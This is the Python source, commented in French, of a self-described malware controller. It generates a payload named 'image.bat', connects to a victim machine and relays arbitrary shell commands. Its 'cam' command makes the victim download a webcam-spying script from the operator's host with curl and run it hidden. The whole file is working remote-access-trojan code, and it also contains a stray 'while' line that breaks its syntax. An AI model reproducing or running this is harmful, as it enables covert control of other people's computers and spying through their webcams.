"""
Author: Martin Calamel
Created: 2025-02-26
Description: module principal pour le configurer le malware
TODO: réorganiser le code
      mettre en place les bonnes pratiques
"""


# importation des modules
import socket, sys,time,os,threading,csv
import payload.cam_pirate as cam
from colorama import Fore,deinit,init
from modules.fonctions import get_self_ip, generation_vecteur, menu, save_ip, read_victime_ip

# Initialisation pour les couleurs
init()

# Recuperation de l'adresse IP hôte
HOST : str = get_self_ip()
save_ip(HOST)

# Affichage du menu
choix :str = menu()


if choix=="1":
    try:
        os.system("start /Min servers/server.py")
        os.system("start /Min node servers/server.js")
        print("server ok")
    except:
        print("error server")
        sys.exit()
    print("generation du payload...")
    generation_vecteur(HOST)
    print("payload enregistré sous le nom image.bat")
    fich = open('txt_files/message.txt','w')
    fich.write("")
    fich.close()



print("démarage de l'ecoute")
mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# mySocket.settimeout(5)
PORT = 55027
ip_victime = read_victime_ip()
print("Resverse lisening on ",ip_victime,"port ",PORT)
while True:
    try:
        mySocket.connect((ip_victime, PORT))
        break
    except:
        continue
print(Fore.GREEN,"Connection OK",Fore.WHITE)
time.sleep(1)
while True:
    msg=input("C> ")
    if msg=="cam":
        msg="pip install opencv-python"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print("importation des modules ok")
        msg="curl http://"+HOST+":8000/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
        mySocket.send(msg.encode("Utf8"))
        while
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print("telechargement du payload ok")
        msg="start C:\\Users\\Public\\Documents\\cam.pyw"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print("lancement du payload ok")
        cam.webcam()
    elif msg=="exit":
        break
    else:
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print(msgServeur)


print("Connexion interrompue.")
mySocket.close()
